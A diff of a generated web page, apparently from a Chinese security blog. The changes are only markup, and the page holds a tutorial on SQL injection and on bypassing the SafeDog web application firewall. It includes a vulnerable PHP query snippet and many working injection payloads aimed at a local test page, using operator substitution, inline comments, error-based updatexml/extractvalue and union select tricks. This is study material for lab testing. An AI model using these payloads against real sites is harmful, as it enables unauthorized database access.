-<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
 <span class="nv">$con</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">,</span><span class="s2">&#34;root&#34;</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$con</span><span class="p">){</span><span class="k">die</span><span class="p">(</span><span class="s1">&#39;Could not connect: &#39;</span> <span class="o">.</span> <span class="nx">mysql_error</span><span class="p">());}</span>
 <span class="nx">mysql_select_db</span><span class="p">(</span><span class="s2">&#34;dvwa&#34;</span><span class="p">,</span> <span class="nv">$con</span><span class="p">);</span>
@@ -683,16 +683,16 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <p>首先先稍微测试一番,发现存在安全狗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1  and 1=1%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1  and 1=1%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -702,7 +702,7 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">and  1	拦截
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">and  1	拦截
 and  &#39;1&#39;    拦截  
 and  a	不拦截 
 and  &#39;a&#39;    拦截  
@@ -721,12 +721,12 @@ and  hex(1)  不拦截
 <p>针对第一种我们可以去看看运算符号 随便找到几个| ^ xor &amp; / * &amp;&amp; || 等等还有很多</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">与运算 a &amp; b  , 
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">与运算 a &amp; b  , 
 或运算 a | b ,  
 异或运算 a ^ b
 </code></pre></td></tr></table>
@@ -734,24 +734,24 @@ and  hex(1)  不拦截
 </div><p>那么可以试着将and替换成&amp;&amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; %26%26 true%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&amp;&amp; || ,oracle不支持 &amp;&amp; ||）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;  || true%23         //将and 1=1替换为|| true,也可以绕过安全狗
 http://127.0.0.1/test.php?id=1&#39;   ||(1) %23 		//使用括号代替空格绕过
 //异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1）
 http://127.0.0.1/test.php?id=1&#39;  xor 1%23			
@@ -762,10 +762,10 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <p>判断查询字段,使用mysql的<code>/*!*/</code>内敛注释去绕过防护,而其中的代码是可以正常执行的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; /*!order*//*!by*/2%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
@@ -777,10 +777,10 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 <p>在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39;=/*!user () regexp 0x5e72*/--+
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
@@ -792,21 +792,21 @@ http://127.0.0.1/test.php?id=1&#39;  xor true%23
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>基于报错信息的注入绕安全狗</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1&#39; and /*!12345updatexml!*/(1,concat(0x7e,version()))%23
 http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23
 </code></pre></td></tr></table>
 </div>
@@ -814,47 +814,47 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 <p>使用大括号去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
 </code></pre></td></tr></table>
 </div>
 </div><p></p>
 <p>使用反引号去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables`
 </code></pre></td></tr></table>
 </div>
 </div><p>使用\N去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\Nfrom information_schema.tables
 </code></pre></td></tr></table>
 </div>
 </div><p>括号法去绕过</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables)))
 </code></pre></td></tr></table>
 </div>
 </div><p>也可以组合起来</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="w"> </span><span class="cm">/*union/*!select-1*/,2,3,4\Nfrom{a`information_schema`.tables}
 </span></code></pre></td></tr></table>
 </div>
 </div><p>这些都是去掉空格的合法语句,当然如果不拦截<code>/*/或/!*/</code>的话,也可以尝试这两个</p>
@@ -865,10 +865,10 @@ http://127.0.0.1/test.php?id=1&#39; and /*!12345extractvalue!*/(1,concat(0x7e,ve
 php+mysql环境下支持的空格有：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">%0a,%0b,%0c,%0d,%20,%09,%a0,/**/
 </code></pre></td></tr></table>
 </div>
 </div><p>其中使用的最多的就是<code>%0a,%0b,%a0,/**/</code>，这四个当作空格插入在语句中来扰乱waf检测。
@@ -887,12 +887,12 @@ Content-Length头长度大于4008
     <pubDate>Fri, 15 May 2020 19:08:11 &#43;0800</pubDate><author>
         <name>bysec</name>
     </author><guid>https://www.bysec.cn/%E5%B7%A5%E5%85%B7%E9%9B%86/</guid>
-    <description><![CDATA[<p>nmap</p>
-<p>dirmap</p>
-<p>XSStrike</p>
-<p>sqlmap</p>
-<p>BurpSuite</p>
-<p>Wireshark</p>
-<p>metasploit-framework</p>]]></description>
+    <description><![CDATA[<h1 id="nmap">nmap</h1>
+<h1 id="dirmap">dirmap</h1>
+<h1 id="xsstrike">XSStrike</h1>
+<h1 id="sqlmap">sqlmap</h1>
+<h1 id="burpsuite">BurpSuite</h1>
+<h1 id="wireshark">Wireshark</h1>
+<h1 id="metasploit-framework">metasploit-framework</h1>]]></description>
 </item></channel>
 </rss>
